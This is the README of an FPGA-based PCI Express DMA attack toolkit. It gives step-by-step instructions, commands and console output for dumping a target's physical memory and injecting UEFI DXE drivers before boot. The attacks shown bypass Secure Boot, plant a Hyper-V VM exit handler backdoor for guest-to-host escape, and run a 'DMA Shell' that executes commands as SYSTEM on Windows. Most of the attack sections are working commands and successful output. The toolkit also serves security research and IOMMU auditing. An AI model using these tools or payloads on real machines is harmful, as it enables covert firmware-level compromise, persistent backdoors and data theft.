
# PCI Express DIY hacking toolkit

[General information](#general-information)  
[Contents](#contents)  
[SP605 board configuration](#sp605-board-configuration)  
[Software configuration](#software-configuration)  
[Examples](#examples)  
[Using Python API](#using-python-api)  
[Practical DMA attacks](#practical-dma-attacks)  
[Option ROM attacks](#option-rom-attacks)  
[Troubleshooting](#troubleshooting)  
[Building project from the source code](#building-project-from-the-source-code)  

## General information

This repository contains a set of tools and proof of concepts related to PCI-E bus and [DMA attacks](https://en.wikipedia.org/wiki/DMA_attack). It includes HDL design that implements software controllable PCI-E gen 1.1 endpoint device for [Xilinx SP605 Evaluation Kit](https://www.xilinx.com/products/boards-and-kits/ek-s6-sp605-g.html) with Spartan-6 FPGA. In comparison with popular [USB3380EVB](http://www.hwtools.net/Adapter/USB3380EVB.html) this design allows to operate with raw Transaction Level Packets (TLP) of PCI-E bus and perform full 64-bit memory read/write operations. To demonstrate applied use cases of the design, [there's a tool](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/uefi_backdoor_simple.py) for pre-boot DMA attacks on UEFI based machines which allows to execute arbitrary UEFI DXE drivers during platform init.  

[There's a program](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/uefi_backdoor_hv.py) that shows how to use pre-boot DMA attacks to inject [Hyper-V VM exit handler backdoor](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorHv/src/DmaBackdoorHv.c) into the [virtualization-based security](https://docs.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs) enabled Windows 10 Enterprise running on UEFI Secure Boot enabled platform. Provided Hyper-V Backdoor PoC might be useful for reverse engineering and exploit development purposes, it [provides an interface](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorHv/backdoor_client/backdoor_library/backdoor_library.cpp) for inspecting of hypervisor state (VMCS, physical/virtual memory, registers, etc.) from the guest partition and perform guest to host VM escape attacks.  

[Another program](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/uefi_backdoor_boot.py) shows how to use pre-boot DMA attacks to inject arbitrary user mode or kernel mode code into the Windows operating system by hijacking of its boot process using [Boot Backdoor](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorBoot/src/DmaBackdoorBoot.c). This program is also can work with DMA Shell &minus; it's Boot Backdoor payload that allows to execute console commands over the rogue PCI-E device, transfer files and load 3-rd party executables into the target operating system at the runtime.  

💾 **Hyper-V Backdoor part of this project has many other features and deployment options than described in this document, you can use it separately from DMA attack tools even without any special hardware: check [its documentation](https://github.com/Cr4sh/s6_pcie_microblaze/tree/master/python/payloads/DmaBackdoorHv)**  

💾 **Boot Backdoor part of this project has many other features and deployment options than described in this document, you can use it separately from DMA attack tools even without any special hardware: check [its documentation](https://github.com/Cr4sh/s6_pcie_microblaze/tree/master/python/payloads/DmaBackdoorBoot)**  

💾 **Python tools from this project and hardware designs for SP605/ZC706 boards also can be used to deploy SMM Backdoor Next Gen with pre-boot DMA attack. Check [its documentation](https://github.com/Cr4sh/SmmBackdoorNg) for more technical details.**

⚙️ **Python tools and payloads from this project, including Hyper-V Backdoor and Boot Backdoor, also can be used with Xilinx Zynq-7000 SoC based boards. There's [a separate project](https://github.com/Cr4sh/zc_pcie_dma) of DMA attacks design for Xilinx ZC706 evaluation kit.**

⚙️ **Python tools and payloads from this project, including Hyper-V Backdoor, also can be used with PicoEVB development board. There's a separate [Pico DMA project](https://github.com/Cr4sh/pico_dma) &minus; fully autonomous pre-boot DMA attack hardware implant for M.2 slot based on PicoEVB development board that can run arbitrary UEFI DXE drivers payload.** 


## Contents

* `s6_pcie_microblaze.xise` &minus; Xilinx ISE project file. 

* `microblaze/pcores/axis_pcie_v1_00_a/` &minus; Custom peripheral module that allows connecting of PCI Express integrated endpoint block of Spartan-6 FPGA as raw TLP stream to MicroBlaze soft processor core. 

* `sdk/srec_bootloader_0/` &minus; Simple bootloader for MicroBlaze soft processor, it using SREC image format and onboard linear flash memory of SP605 to load and store main MicroBlaze program. 

* `sdk/main_0/` &minus; Main program for MicroBlaze soft processor, it forwards raw TLP packets of PCI-E bus into the TCP connection using onboard Ethernet port of SP605 and [lwIP network stack](http://www.nongnu.org/lwip/2_0_x/index.html). 

* `python/pcie_lib.py` &minus; Python library to interact over the network with main MicroBlaze program running on SP605 board, it implements various low level and high level abstractions to work with TLP level of PCI-E from the Python code.

* `python/pcie_mem.py` &minus; Command line program that dumps host RAM into the screen or output file by sending MRd TLPs.

* `python/pcie_mem_scan.py` &minus; Command line program that scans target host for physical memory ranges accessible over PCI-E bus, it's useful for a security audit of IOMMU enabled platforms (examples: [1](https://twitter.com/d_olex/status/886050560637493248), [2](https://twitter.com/d_olex/status/886093746651013120), [3](https://twitter.com/d_olex/status/886320724641628160), [4](https://twitter.com/d_olex/status/886399248706682881)).

* `python/uefi_backdoor_simple.py` &minus; Command line program for pre-boot DMA attack that injects dummy UEFI driver into the target machine boot sequence.

* `python/uefi_backdoor_hv.py` &minus; Command line program for pre-boot DMA attack that injects Hyper-V VM exit handler backdoor into the target system boot sequence.

* `python/uefi_backdoor_boot.py` &minus; Command line program for pre-boot DMA attack that injects Boot Backdoor into the target system boot sequence.

* `python/payloads/DmaBackdoorSimple/` &minus; Source code of dummy UEFI DXE driver to use with `uefi_backdoor_simple.py`.

* `python/payloads/DmaBackdoorHv/` &minus; Source code of UEFI DXE driver to use with `uefi_backdoor_hv.py`, it implements Hyper-V Backdoor functionality. 

* `python/payloads/DmaBackdoorBoot/` &minus; Source code of UEFI DXE driver to use with `uefi_backdoor_boot.py`, it implements Boot Backdoor functionality. 


## SP605 board configuration

<img src="https://raw.githubusercontent.com/Cr4sh/s6_pcie_microblaze/master/docs/images/board.jpg" width="800">

Xilinx UG526 document also known as [SP605 Hardware User Guide](https://www.xilinx.com/support/documentation/boards_and_kits/ug526.pdf) is your best friend if you want to know more details about usage and configuration of this nice board.

1) To load bitstream from onboard SPI flash chip you need to configure SP605 by turning `SW1` switches into the 1-ON, 2-OFF position.

2) Now you have to write FPGA bitstream into the SPI flash. Use `s6_pcie_microblaze.mcs` file if you want to do this over JTAG with the help of Xilinx iMPACT utility (see [this tutorial](https://www.xilinx.com/support/documentation/boards_and_kits/sp605_PCIe_Gen1_x1_pdf_xtp065_13.4.pdf)), or `s6_pcie_microblaze.bin` if you want to use [external SPI flash programmer](https://www.flashrom.org/Supported_programmers) connected to `J17` header of SP605 (which is the fastest and more convenient way). 

In case of [flashrom](https://www.flashrom.org/) compatible SPI flash programmer you can use `flash_to_spi.py` program as a flashrom wrapper:

```
$ ./flash_to_spi.py linux_spi:dev=/dev/spidev1.0 s6_pcie_microblaze.bin
Using region: "main".
Calibrating delay loop... OK.
Found Winbond flash chip "W25Q64.V" (8192 kB, SPI) on linux_spi.
Reading old flash chip contents... done.
Erasing and writing flash chip...
Warning: Chip content is identical to the requested image.
Erase/write done.  
```

3) Bitstream file that was written into the SPI flash in previous step includes custom bootloader for MicroBlaze core (see [bootloader.c](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/sdk/srec_bootloader_0/src/bootloader.c) for more details). This bootloader allows to configure board options and write main program into the linear flash over the UART port of SP605.

To boot MicroBlaze into the update mode you have to disconnect SPI flash programmer and power the board holding `SW4` pushbutton switch, release `SW4` when `DS6` LED indicating active update mode turns on. 

4) To write main program (see [main.c](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/sdk/main_0/src/main.c) for more details) into the linear flash you need to connect your computer to the UART bridge USB port of SP605 and run `bootloader_ctl.py` program with `--flash` option:

```
$ easy_install pyserial
$ ./python/bootloader_ctl.py /dev/ttyUSB0 --flash sdk/main_0/Debug/main_0.srec
[+] Opening device "/dev/ttyUSB0"...
[+] Flasing 339852 bytes from "sdk/main_0/Debug/main_0.srec"...
Erasing flash...
Writing 0x100 bytes at 0x00100000
Writing 0x100 bytes at 0x00100100

...

Writing 0x100 bytes at 0x00152e00
Writing 0x8c bytes at 0x00152f00
[+] DONE
```

5) To configure the network settings you need to run `bootloader_ctl.py` program with `--config` option:

```
$ ./python/bootloader_ctl.py /dev/ttyUSB0 --config 192.168.2.247:255.255.255.0:192.168.2.1:28472
[+] Opening device "/dev/ttyUSB0"...
[+] Updating board settings...

 Address: 192.168.2.247
 Netmask: 255.255.255.0
 Gateway: 192.168.2.1
    Port: 28472

Erasing flash...
Writing 0x12 bytes at 0x00000000
[+] DONE
```

6) Now you can exit from the update mode and boot main MicroBlaze program from linear flash:

```
$ ./python/bootloader_ctl.py /dev/ttyUSB0 --boot
[+] Opening device "/dev/ttyUSB0"...
[+] Exitting from update mode...

SREC Bootloader
Loading SREC image from flash at address: 42000000
Executing program starting at address: 00000000
Loading settings from flash...
[+] Address: 192.168.2.247
[+] Netmask: 255.255.255.0
[+] Gateway: 192.168.2.1
auto-negotiated link speed: 100
start_application(): TCP server is started at port 28472
```

Main program prints its error messages into the onboard UART, you can use `--console` option of `bootloader_ctl.py` to monitor this messages in real time. 

7) Connect SP605 to the PCI-E slot of the target computer and turn the computer on. When PCI-E link was successfully established you will see `DS3` and `DS4` LEDs on.

8) Run `lspci` command on target computer to ensure that its operating system is seeing your board as appropriate PCI-E device:

```
# lspci | grep Xilinx
01:00.0 Ethernet controller: Xilinx Corporation Default PCIe endpoint ID
```

JTAG related notes: SP605 has onboard USB to JTAG interface compatible with iMPACT and others Xilinx tools. However, it's not very good so if you're planning to use onboard JTAG to program SPI flash like it was described in Xilinx tutorial you have to do the following things:

* Remove any hardware connected to the FMC slot of SP605 while working with JTAG. 

* In Xilinx iMPACT settings configure JTAG interface to use 750 KHz speed (on more higher speed it works unstable).

Xilinx SP605 board is also can be connected to the Thunderbolt 2/3 external port of the target computer using [Thunderbolt to PCI-E expansion chassis](https://www.amazon.com/s/ref?field-keywords=thunderbolt+to+pcie). Please note, that SP605 is [relatively large board](https://www.xilinx.com/support/answers/53808.html) so it might not fit into some of the chassis. For example, I'm using [HighPoint RocketStor 6361A](http://www.highpoint-tech.com/USA_new/series_RS6361A_overview.htm) Thunderbolt 2 enclosure which works fine with my MacBook Pro.


## Software configuration

Python tools to interact with the board and tiny implementation of PCI-E transaction layer are located in `python` folder. Because main MicroBlaze program uses TCP connection to transfer TLP packets no any drivers or 3rd party dependencies needed, you can use provided Python code on any operating system. 

To set up target board IP address and port edit `PCIE_TO_TCP_ADDR` variable in `python/pcie_lib_config.py` file.


## Examples

Information about PCI-E device implemented by provided FPGA bitstream (just like it seeing by target computer):

```
$ lspci -vvs 01:00.0
01:00.0 Ethernet controller: Xilinx Corporation Default PCIe endpoint ID
    Subsystem: Xilinx Corporation Default PCIe endpoint ID
    Control: I/O- Mem- BusMaster- SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR- FastB2B- DisINTx-
    Status: Cap+ 66MHz- UDF- FastB2B- ParErr- DEVSEL=fast >TAbort- <TAbort- <MAbort- >SERR- <PERR- INTx-
    Interrupt: pin A routed to IRQ 11
    Region 0: Memory at f7d00000 (32-bit, non-prefetchable) [disabled] [size=1M]
    Capabilities: [40] Power Management version 3
        Flags: PMEClk- DSI- D1+ D2+ AuxCurrent=0mA PME(D0+,D1+,D2+,D3hot+,D3cold-)
        Status: D0 NoSoftRst+ PME-Enable- DSel=0 DScale=0 PME-
    Capabilities: [48] MSI: Enable- Count=1/1 Maskable- 64bit+
        Address: 0000000000000000  Data: 0000
    Capabilities: [58] Express (v1) Endpoint, MSI 00
        DevCap: MaxPayload 512 bytes, PhantFunc 0, Latency L0s unlimited, L1 unlimited
            ExtTag- AttnBtn- AttnInd- PwrInd- RBE+ FLReset-
        DevCtl: Report errors: Correctable- Non-Fatal- Fatal- Unsupported-
            RlxdOrd- ExtTag- PhantFunc- AuxPwr- NoSnoop+
            MaxPayload 128 bytes, MaxReadReq 512 bytes
        DevSta: CorrErr+ UncorrErr- FatalErr+ UnsuppReq- AuxPwr- TransPend-
        LnkCap: Port #0, Speed 2.5GT/s, Width x1, ASPM L0s, Latency L0 unlimited, L1 unlimited
            ClockPM- Surprise- LLActRep- BwNot-
        LnkCtl: ASPM Disabled; RCB 64 bytes Disabled- Retrain- CommClk-
            ExtSynch- ClockPM- AutWidDis- BWInt- AutBWInt-
        LnkSta: Speed 2.5GT/s, Width x1, TrErr- Train- SlotClk- DLActive- BWMgmt- ABWMgmt-
    Capabilities: [100 v1] Device Serial Number 00-00-00-01-01-00-0a-35
```

Example of PCI-E device as it shown in Apple macOS hardware information when connected to the Thunderbolt 2 port of MacBook Pro:

<img src="https://raw.githubusercontent.com/Cr4sh/s6_pcie_microblaze/master/docs/images/macos_pcie.png" width="623">


On the attacker side you can use `pcie_cfg.py` program to view configuration space registers of PCI-E device:

```
$ ./pcie_cfg.py
[+] PCI-E link with target is up
[+] Device address is 03:00.0

           VENDOR_ID = 0x10ee
           DEVICE_ID = 0x1337
             COMMAND = 0x0
              STATUS = 0x10
            REVISION = 0x0
          CLASS_PROG = 0x0
        CLASS_DEVICE = 0x200
     CACHE_LINE_SIZE = 0x10
       LATENCY_TIMER = 0x0
         HEADER_TYPE = 0x0
                BIST = 0x0
      BASE_ADDRESS_0 = 0x90500000
      BASE_ADDRESS_1 = 0x0
      BASE_ADDRESS_2 = 0x0
      BASE_ADDRESS_3 = 0x0
      BASE_ADDRESS_4 = 0x0
      BASE_ADDRESS_5 = 0x0
         CARDBUS_CIS = 0x0
 SUBSYSTEM_VENDOR_ID = 0x10ee
        SUBSYSTEM_ID = 0x7
         ROM_ADDRESS = 0x0
      INTERRUPT_LINE = 0xff
       INTERRUPT_PIN = 0x1
             MIN_GNT = 0x0
             MAX_LAT = 0x0
```

```
$ ./pcie_cfg.py -x
[+] PCI-E link with target is up
[+] Device address is 03:00.0

0000: 0x10ee 0x1337
0004: 0x0000 0x0010
0008: 0x0000 0x0200
000c: 0x0010 0x0000
0010: 0x0000 0x9050
0014: 0x0000 0x0000
0018: 0x0000 0x0000
001c: 0x0000 0x0000
0020: 0x0000 0x0000
0024: 0x0000 0x0000
0028: 0x0000 0x0000
002c: 0x10ee 0x0007
0030: 0x0000 0x0000
0034: 0x0040 0x0000
0038: 0x0000 0x0000
003c: 0x01ff 0x0000

      ...

```

Here's an example of dumping 0x80 bytes of target computer physical memory starting from zero address using `pcie_mem.py` program:

```
$ DEBUG_TLP=1 ./pcie_mem.py 0x0 0x80
TLP TX: size = 0x04, source = 01:00.0, type = MRd64
        tag = 0x00, bytes = 0x84, addr = 0x00000000

        0x20000021 0x010000ff 0x00000000 0x00000000

TLP RX: size = 0x23, source = 00:00.0, type = CplD
        tag = 0x00, bytes = 132, req = 01:00.0, comp = 00:00.0

        0x4a000020 0x00000084 0x01000000
        0xf3ee00f0 0xf3ee00f0 0xc3e200f0 0xf3ee00f0 
        0xf3ee00f0 0x54ff00f0 0x053100f0 0xfe3000f0 
        0xa5fe00f0 0xe40400e8 0xf3ee00f0 0xf3ee00f0 
        0xf3ee00f0 0xf3ee00f0 0x57ef00f0 0x53ff00f0 
        0x140000c0 0x4df800f0 0x41f800f0 0x59ec00f0 
        0x39e700f0 0xd40600e8 0x2ee800f0 0xd2ef00f0 
        0x00e000f0 0xf2e600f0 0x6efe00f0 0x53ff00f0 
        0x53ff00f0 0xa4f000f0 0xc7ef00f0 0xb19900c0

TLP RX: size = 0x04, source = 00:00.0, type = CplD
        tag = 0x00, bytes = 4, req = 01:00.0, comp = 00:00.0

        0x4a000001 0x00000004 0x01000000
        0xf3ee00f0

00000000: f3 ee 00 f0 f3 ee 00 f0 c3 e2 00 f0 f3 ee 00 f0 | ................
00000010: f3 ee 00 f0 54 ff 00 f0 05 31 00 f0 fe 30 00 f0 | ....T....1...0..
00000020: a5 fe 00 f0 e4 04 00 e8 f3 ee 00 f0 f3 ee 00 f0 | ................
00000030: f3 ee 00 f0 f3 ee 00 f0 57 ef 00 f0 53 ff 00 f0 | ........W...S...
00000040: 14 00 00 c0 4d f8 00 f0 41 f8 00 f0 59 ec 00 f0 | ....M...A...Y...
00000050: 39 e7 00 f0 d4 06 00 e8 2e e8 00 f0 d2 ef 00 f0 | 9...............
00000060: 00 e0 00 f0 f2 e6 00 f0 6e fe 00 f0 53 ff 00 f0 | ........n...S...
00000070: 53 ff 00 f0 a4 f0 00 f0 c7 ef 00 f0 b1 99 00 c0 | S...............
```

Example of saving physical memory into the file:

```
./pcie_mem.py 0x14000000 0x8000 dumped.bin
[+] PCI-E link with target is up
[+] Device address is 01:00.0
[+] Reading 0x14000000
[+] Reading 0x14001000
[+] Reading 0x14002000
[+] Reading 0x14003000
[+] Reading 0x14004000
[+] Reading 0x14005000
[+] Reading 0x14006000
[+] Reading 0x14007000
[+] Reading 0x14008000
32768 bytes written into the dumped.bin
```

Provided Python software uses some environment variables to override default values of certain options:

* `DEBUG_TLP` &minus; If set to `1` print TX and RX TLP packets dump into the standard output.

* `TARGET_ADDR` &minus; `<address>:<port>` string to override IP address of the board specified in `python/pcie_lib_config.py` file.


## Using Python API

Python library `pcie_lib.py` provides low level API to send and receive PCE-E TLP packets along with abstractions for different TLP types and high level physical memory access API.

The following program demonstrates how to work with raw TLPs using `pcie_lib.py`:

```python
from pcie_lib import *

#
# Open PCI-E device, optional addr parameter overrides value specified in pcie_lib_config.py
# file or TARGET_ADDR environment variable
#
dev = TransactionLayer(addr = ( '192.168.2.247', 28472 ))

# get bus:device.function address of our PCI-E endpoint
bus_id = dev.get_bus_id()

#
# MRd TLP request which reads 1 dword of memory at address 0x1000
#
tlp_tx = [ 0x20000001,                   # TLP type and data size
           0x000000ff | (bus_id << 16),  # requester ID
           0x00000000,                   # high dword of physical memory address
           0x00001000 ]                  # low dword of physical memory address
         
# send TLP
dev.write(tlp_tx)

# receive root complex reply
tlp_rx = dev.read(raw = True)

# prints 4a000001 00000004 01000000 00000000
print('%.8x %.8x %.8x %.8x' % tuple(tlp_rx))

# check for CplD TLP format and type
assert (tlp_rx[0] >> 24) & 0xff == 0x4a

# print readed dword
print('%.8x' % tlp_rx[3])

dev.close()
```

Working with TLPs using more convenient high level abstractions:

```python
# MRd TLP request which reads 1 dword of memory at address 0x1000
tlp_tx = dev.PacketMRd64(dev.bus_id, 0x1000, 4)

# send TLP
dev.write(tlp_tx)

# receive root complex reply
tlp_rx = dev.read()

# check for CplD TLP
assert isinstance(tlp_rx, dev.PacketCplD)

# print readed dword
print('%.8x' % tlp_rx.data[0])
```

Accessing physical memory with high level API:

```python
# write bytes to memory
dev.mem_write(0x1000, '\xAA' * 0x10)

# write single qword/dword/word/byte to memory
dev.mem_write_8(0x1000, 0)
dev.mem_write_4(0x1000, 0)
dev.mem_write_2(0x1000, 0)
dev.mem_write_1(0x1000, 0)

# read bytes from memory
print(repr(dev.mem_read(0x1000, 0x10)))

# read single qword/dword/word/byte from memory
print('%.16x' % dev.mem_read_8(0x1000))
print('%.8x' % dev.mem_read_4(0x1000))
print('%.4x' % dev.mem_read_2(0x1000))
print('%.2x' % dev.mem_read_1(0x1000))
```


## Practical DMA attacks

One of the main goals of this project is providing flexible and convenient set of tools to perform so called pre-boot DMA attacks, in comparison with regular DMA attacks they are targeting pre-boot environment of UEFI DXE phase of the platform initialization rather than operating system itself. Such attacks allows to run malicious code at relatively early stages when [IOMMU](https://en.wikipedia.org/wiki/Input%E2%80%93output_memory_management_unit) and other security features of the operating system are not initialized yet. 

<img src="https://raw.githubusercontent.com/Cr4sh/s6_pcie_microblaze/master/docs/images/boot_phases.jpg" width="610">

Pre-boot DMA attacks allows to bypass various security features of the platform firmware like UEFI secure boot or [Intel Boot Guard](https://edk2-docs.gitbook.io/understanding-the-uefi-secure-boot-chain/secure_boot_chain_in_uefi/intel_boot_guard).

Python program `uefi_backdoor_simple.py` injects dummy UEFI DXE driver located in `payloads/DmaBackdoorSimple` folder into the target system boot sequence using pre-boot DMA attack described above. To use this program you have to perform the following steps:

1) Power off the target computer.

2) Connect SP605 board to the PCI-E (or Mini PCI-E, or M.2) port of the target computer.

3) Turn the borad on and ensure that Microblaze firmware was successfully initialized by pinging an IP address that was specified during the board configuration with `bootloader_ctl.py` program. 

4) Run the following command to start pre-boot DMA attack: 

```
$ ./uefi_backdoor_simple.py --driver payloads/DmaBackdoorSimple/DmaBackdoorSimple_X64.efi
```

5) Power on the target computer, in case of successful attack after the couple of seconds you will see red debug messages screen of injected UEFI DXE driver:

<img src="https://raw.githubusercontent.com/Cr4sh/s6_pcie_microblaze/master/docs/images/backdoor_simple.png" width="540">

An example of `uefi_backdoor_simple.py` console output after the successful attack:

```
$ ./uefi_backdoor_simple.py --driver payloads/DmaBackdoorSimple/DmaBackdoorSimple_X64.efi
[+] Using UEFI system table hook injection method
[+] Reading DXE phase payload from payloads/DmaBackdoorSimple/DmaBackdoorSimple_X64.efi
[!] Bad MRd TLP completion received
[!] Bad MRd TLP completion received
[!] Bad MRd TLP completion received
[+] PCI-E link with target is up
[+] TSEG is somewhere around 0xd7000000
[+] PE image is at 0xd6260000
[+] EFI_SYSTEM_TABLE is at 0xd61eaf18
[+] EFI_BOOT_SERVICES is at 0xd680aa00
[+] EFI_BOOT_SERVICES.LocateProtocol() address is 0xd67e2c18
Backdoor image size is 0x1240
Backdoor entry RVA is 0x31c
Planting DXE stage driver at 0x10000...
Hooking LocateProtocol(): 0xd67e2c18 -> 0x0001031c
0.780202 sec.
[+] DXE driver was planted, waiting for backdoor init...
[+] DXE driver was executed
[+] DONE
```

This dummy UEFI DXE driver along with `uefi_backdoor_simple.py` program can be used as skeleton project to implement various attacks like injecting of malicious code into the operating system bootloader, kernel or hypervisor.

There's also another Python program &minus; `uefi_backdoor_hv.py`, it injects Hyper-V VM exit handler backdoor located in `payloads/DmaBackdoorHv` folder into the target system boot sequence exactly in the same way as previous dummy UEFI DXE driver. Here's an example of its usage:

```
$ ./uefi_backdoor_hv.py --driver payloads/DmaBackdoorHv/DmaBackdoorHv_X64.efi
[+] Using UEFI system table hook injection method
[+] Reading DXE phase payload from payloads/DmaBackdoorHv/DmaBackdoorHv_X64.efi
[+] Waiting for PCI-E link...
[!] PCI-E endpoint is not configured by root complex yet
[!] PCI-E endpoint is not configured by root complex yet
[!] PCI-E endpoint is not configured by root complex yet
[!] Bad MRd TLP completion received
[+] PCI-E link with target is up
[+] Looking for DXE driver PE image...
[+] PE image is at 0x77160000
[+] EFI_SYSTEM_TABLE is at 0x7a03e018
[+] EFI_BOOT_SERVICES is at 0x7a38fa30
[+] EFI_BOOT_SERVICES.LocateProtocol() address is 0x7a3987b4
Backdoor image size is 0x2c20
Backdoor entry RVA is 0xbd4
Planting DXE stage driver at 0xc0000...
Hooking LocateProtocol(): 0x7a3987b4 -> 0x000c0bd4
3.611646 sec.
[+] DXE driver was planted, waiting for backdoor init...
[+] DXE driver was executed, you can read its debug messages by running this program with --debug-output option
[+] Waiting for Hyper-V load...
[+] Hyper-V image was loaded

    Hyper-V image base: 0xfffff8072d690000
           Image entry: 0xfffff8072d901360
       VM exit handler: 0xfffff8072d8add90

[+] DONE
```

UEFI DXE driver of Hyper-V Backdoor is also printing its debug messages on the screen. In addition, you can use `--debug-output` option of `uefi_backdoor_hv.py` to read this debug messages from the target system physical memory and print them into the stdout:

```
$ ./uefi_backdoor_hv.py --debug-output
[+] PCI-E link with target is up
[+] Debug output buffer address is 0x79db3000

DmaBackdoorHv.c(1018) : ******************************
DmaBackdoorHv.c(1019) :
DmaBackdoorHv.c(1020) :   Hyper-V backdoor loaded!
DmaBackdoorHv.c(1021) :
DmaBackdoorHv.c(1022) : ******************************
DmaBackdoorHv.c(1055) : Image address is 0xc0000
DmaBackdoorHv.c(275) : BackdoorImageRealocate(): image size = 0x3260
DmaBackdoorHv.c(1065) : Resident code base address is 0x79daf000
DmaBackdoorHv.c(794) : Protocol notify handler is at 0x79daf364
DmaBackdoorHv.c(819) : BackdoorEntryResident()
DmaBackdoorHv.c(830) : OpenProtocol() hook was set, handler = 0x79db1477
DmaBackdoorHv.c(835) : ExitBootServices() hook was set, handler = 0x79db1487
DmaBackdoorHv.c(447) : winload.dll is at 0x8ee000
DmaBackdoorHv.c(448) : winload!BlLdrLoadImage() is at 0x984a10
DmaBackdoorHv.c(477) : 535 free bytes found at the end of the code section at 0xa4ade9
DmaBackdoorHv.c(527) : winload!BlLdrLoadImage() hook was set, handler is at 0x79daf50c
DmaBackdoorHv.c(350) : new_BlLdrLoadImage(): Path = "\WINDOWS\system32\mcupdate_GenuineIntel.dll"
DmaBackdoorHv.c(350) : new_BlLdrLoadImage(): Path = "\WINDOWS\system32\hvix64.exe"
HyperV.c(369) : HyperVHook(): Hyper-V image is at 0xfffff80144e0d000
HyperV.c(388) : HyperVHook(): Resources section RVA is 0x1400000 (0x200000 bytes)
HyperV.c(425) : HyperVHook(): Code section RVA is 0x200000
HyperV.c(604) : HyperVHook(): Hyper-V VM exit handler is at 0xfffff8014502ad90
HyperV.c(605) : HyperVHook(): Backdoor code size is 684 bytes
DmaBackdoorHv.c(350) : new_BlLdrLoadImage(): Path = "\WINDOWS\system32\kdstub.dll"
DmaBackdoorHv.c(350) : new_BlLdrLoadImage(): Path = "\WINDOWS\system32\hv.exe"
DmaBackdoorHv.c(560) : new_ExitBootServices() called
```

To get more information about Hyper-V Backdoor use cases and features [check its README file](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorHv/README.MD) with detailed information.

Python programs `uefi_backdoor_boot.py` and `uefi_backdoor_boot_shell.py` are used to inject Boot Backdoor into the target system boot sequence. Boot Backdoor allows to run arbitrary user mode or kernel mode code under the Windows operating system and its payload called DMA Shell allows to execute console commands and transfer the files. To deploy Boot Backdoor with DMA Shell using pre-boot DMA attack you have to perform the same steps as described above but using `uefi_backdoor_boot_shell.py` program:

```
$ ./uefi_backdoor_boot_shell.py --command "whoami"
[+] 44544 bytes of payload image read
[+] 21299 bytes of payload image after the compression
[+] Using UEFI system table hook injection method
[+] Waiting for PCI-E link...
[!] PCI-E endpoint is not configured by root complex yet
[!] PCI-E endpoint is not configured by root complex yet
[!] PCI-E endpoint is not configured by root complex yet
[!] Bad MRd TLP completion received
[!] Bad MRd TLP completion received
[+] PCI-E link with target is up
[+] Device address is 01:00.0
[+] Looking for DXE driver PE image...
[+] PE image is at 0x7a070000
[+] EFI_SYSTEM_TABLE is at 0x7a03e018
[+] EFI_BOOT_SERVICES is at 0x7a38fa30
[+] EFI_BOOT_SERVICES.LocateProtocol() address is 0x7a3987b4
Backdoor image size is 0x14847
Backdoor entry RVA is 0x908
Planting DXE stage driver at 0xc0000...
Hooking LocateProtocol(): 0x7a3987b4 -> 0x000c0908
1.759079 sec.
[+] DXE driver was planted, waiting for backdoor init...
[+] DXE driver was executed, you can read its debug messages by running this program with --debug-output option
[+] Waiting for backdoor load...
[+] Winload image was loaded

              Image base: 0x0086a000
 OslArchTransferToKernel: 0x009c4b20

[+] DONE
[+] Waiting for payload init...
[+] Payload shared memory region is at 0x00200000
[+] Executing command: whoami
[+] Process exit code: 0x00000000

nt authority\system
```

Now, when Boot Backdoor with its payload was sucessfully loaded, you can run `uefi_backdoor_boot_shell.py` with `--attach` option to communicate with currently running instance of DMA Shell:

```
$ ./uefi_backdoor_boot_shell.py --attach --command "hostname"
[+] PCI-E link with target is up
[+] Device address is 01:00.0
[+] Payload shared memory region is at 0x00200000
[+] Executing command: hostname
[+] Process exit code: 0x00000000

DESKTOP-E52IJJ8
```

Also, you can use `--debug-output` option to get debug messages of Boot Backdoor UEFI DXE driver and print them into the stdout:

```
$ ./uefi_backdoor_boot_shell.py --debug-output
[+] PCI-E link with target is up
[+] Debug output buffer address is 0x79da2000

DmaBackdoorBoot.c(630) : ******************************
DmaBackdoorBoot.c(631) :
DmaBackdoorBoot.c(632) :   Boot backdoor loaded!
DmaBackdoorBoot.c(633) :
DmaBackdoorBoot.c(634) : ******************************
DmaBackdoorBoot.c(668) : Image address is 0xc0000
DmaBackdoorBoot.c(711) : Payload is not present
DmaBackdoorBoot.c(276) : BackdoorImageRealocate(): image size = 0xf500
DmaBackdoorBoot.c(722) : Resident code base address is 0x79d8c000
DmaBackdoorBoot.c(430) : Protocol notify handler is at 0x79d8c364
DmaBackdoorBoot.c(455) : BackdoorEntryResident()
DmaBackdoorBoot.c(464) : ExitBootServices() hook was set, handler = 0x79d8ded7
DmaBackdoorBoot.c(358) : new_ExitBootServices() called
Winload.c(419) : WinloadHook(): winload image is at 0x86a000
Winload.c(507) : winload!HvlpBelow1MbPage is at 0xa037c8
Winload.c(508) : winload!HvlpBelow1MbPageAllocated is at 0xa037b9
Winload.c(587) : winload!OslArchTransferToKernel() is at 0x9c4b20
```

To get more information about Boot Backdoor use cases and features [check its README file](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorBoot/README.MD) with detailed information.

Python programs `uefi_backdoor_simple.py`, `uefi_backdoor_hv.py`, `uefi_backdoor_boot.py` and `uefi_backdoor_boot_shell.py` supports two different ways to pass execution to the injected UEFI DXE driver image:

 * `EFI_SYSTEM_TABLE` hijack &minus; scan system memory down from physical address `0xf0000000` to `0` with `0x10000` bytes step in order to find EFI system table by its signature and patch `LocateProtocol()` function address. To override memory scan options you can use `SCAN_FROM` and `SCAN_STEP` environment variables.

 * `PROTOCOL_ENTRY` hijack &minus; scan system memory up from physical address `0x76000000` to `0xa0000000` with `0x1000` bytes step to find `EFI_CPU_IO2_PROTOCOL` structure of [CPU I/O 2 protocol](https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Protocol/CpuIo2.h) and patch one of its functions. To override memory scan options you can use `SCAN_FROM`, `SCAN_TO` and `SCAN_STEP` environment variables.

